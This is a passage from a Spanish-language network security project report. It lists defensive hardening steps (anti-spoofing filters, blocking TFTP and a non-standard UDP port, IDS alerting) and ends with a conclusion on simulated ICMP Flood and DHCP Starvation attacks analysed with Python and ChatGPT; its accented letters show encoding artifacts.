    1.  Activar Reverse Path Filtering Permite detectar y descartar paquetes con direcciones de origen falsificadas. sysctl -w net.ipv4.conf.all.rp_filter=1
    2.  Aplicar Unicast Reverse Path Forwarding (uRPF). Se recomienda habilitar uRPF en modo estricto para evitar spoofing en redes internas. ip verify unicast source reachable-via rx

5.  **Mitigaci√≥n contra TFTP broadcast no autorizado 5.1.** Bloquear el puerto UDP/69 salvo excepciones expl√≠citas. Restringirlo en toda la red interna para evitar transferencia abierta de archivos. iptables -A INPUT -p udp ‚Äìdport 69 -j DROP

    1.  Uso de ACLs Aplicar listas de control para bloquear solicitudes hacia broadcast donde no son necesarias. deny udp any any eq 69

6.  **Mitigaci√≥n contra canales UDP no est√°ndar**

    1.  Bloquear el tr√°fico hacia el puerto 16990 Cerrar el puerto 16990 en el firewall perimetral y local si no existe una justificaci√≥n documentada. *\[...\]*

7.  **Mitigaci√≥n continua (Monitoreo y endurecimiento)**

    1.  Configurar un IDS/IPS. Se recomienda utilizar Snort o Suricata con reglas espec√≠ficas para detectar:

    -   Flood ICMP Solicitudes
    -   DHCP an√≥malas
    -   Escaneos SYN
    -   Spoofing
    -   Uso de puertos no est√°ndar

    2.  Establecimiento de alertas. Configurar alertas en herramientas de monitoreo como Zabbix, PRTG o Grafana. Los umbrales sugeridos incluyen: Aumento anormal en tr√°fico ICMP, Incremento en solicitudes DHCP, Elevaci√≥n en paquetes TCP SYN, Actividad inesperada en puertos UDP
    3.  Endurecimiento de sistemas Actualizaci√≥n continua de sistemas y firmware Deshabilitar servicios no utilizados (como TFTP) Monitoreo de integridad con herramientas como Wazuh o Tripwire
:::

# Conclusi√≥n del Proyecto

El desarrollo integral del proyecto permiti√≥ demostrar de manera pr√°ctica c√≥mo distintos ataques de denegaci√≥n de servicio ‚Äîparticularmente ICMP Flood y DHCP Starvation‚Äî pueden comprometer la disponibilidad de una red incluso en escenarios locales aparentemente protegidos. La simulaci√≥n confirm√≥ que el ICMP Flood provoca un impacto inmediato y masivo en el tr√°fico, mientras que el DHCP Starvation opera de forma silenciosa hasta agotar los recursos del servidor DHCP. El an√°lisis de tr√°fico con Python y los resultados generados por ChatGPT mostraron patrones claros de anomal√≠as, identificando a los dispositivos involucrados y validando la naturaleza de los ataques. En la √∫ltima fase resalta la crucialidad de un experto en √°rea para discriminar comportamientos an√≥malos de los com√∫nes, contextualizar tr√°fico en una red y comprender la configuraci√≥n y medidas de prevenci√≥n personalizadas: √°reas en las cuales fallan las herramientas de inteligencia artificial. No obstante, estas pueden detectar en corto tiempo (aunque limitadas por el peso de los archivos) bastantes comportamientos generalmente denominados como at√≠picos. Este enfoque complementario entre simulaci√≥n, an√°lisis estad√≠stico y diagn√≥stico asistido por IA refuerza la importancia de la observabilidad y la correlaci√≥n de eventos en la ciberseguridad moderna. En conjunto, el proyecto evidencia la urgencia de implementar estrategias de defensa ya que cualquier red se encuentra comunmente vulnerable.